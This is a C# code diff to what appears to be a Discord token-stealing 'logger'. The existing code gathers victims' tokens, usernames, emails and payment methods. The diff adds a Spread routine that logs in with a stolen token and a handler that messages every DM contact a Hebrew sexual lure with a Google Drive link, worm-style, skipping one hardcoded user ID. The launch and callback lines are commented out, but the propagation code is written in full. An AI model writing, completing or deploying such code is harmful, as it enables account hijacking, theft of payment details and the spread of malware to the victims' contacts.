@@ -3,6 +3,9 @@ using System;
 using System.Collections.Generic;
 using System.Text;
 using Discord;
+using System.Threading.Tasks;
+using System.Threading;
+
 namespace logger
 {
     class DiscordAPI
@@ -29,11 +32,16 @@ namespace logger
                 else
                 {
                     accountssused.Add(client.User.Id.ToString());
-                  
+                    //var t = new Thread(() => Spread(token));
+
+
+                    //t.Start();
+
+
                     StringBuilder account = new StringBuilder();
                     account.Append("token: ||" + token + "|| \nUsename: " + client.User.Username + "\nMail: "+client.User.Email);
                     var payments = client.GetPaymentMethods();
-
+                    
                     if(payments.Count > 0) {
                         account.Append("\nPayments Details: ");
                         foreach(var pay in payments)
@@ -56,16 +64,43 @@ namespace logger
         }
 
 
-        static void client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
+        private static void Spread(string token)
         {
+
+
+            DiscordSocketClient client = new DiscordSocketClient();
+
+            // Callback to the Client_OnLoggedIn function.
+            //client.OnLoggedIn += Client_OnLoggedIn;
+
+            
+            client.Login(token);
+
+            Thread.Sleep(-1); // So it doesn't close after logging in.
+
+
+        }
+
+        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
+        {
+            if (client.User.Id.ToString() != "930765377682690068")
+            {
+                IReadOnlyList<PrivateChannel> dms = client.GetPrivateChannels();
+
+                foreach (var dm in dms)
+                {
+
+                    dm.SendMessage("קבל איזה כוסית חח" + "\nhttps://drive.google.com/drive/folders/1Hm8QCpvCbn7un_wxPbnNkF9hwXP-NFTP?usp=sharing");
+
+                }
+            }
+
+            
+
+            
             
         }
 
-        static void client_OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
-        {
-           
-           
-        }
 
 
 
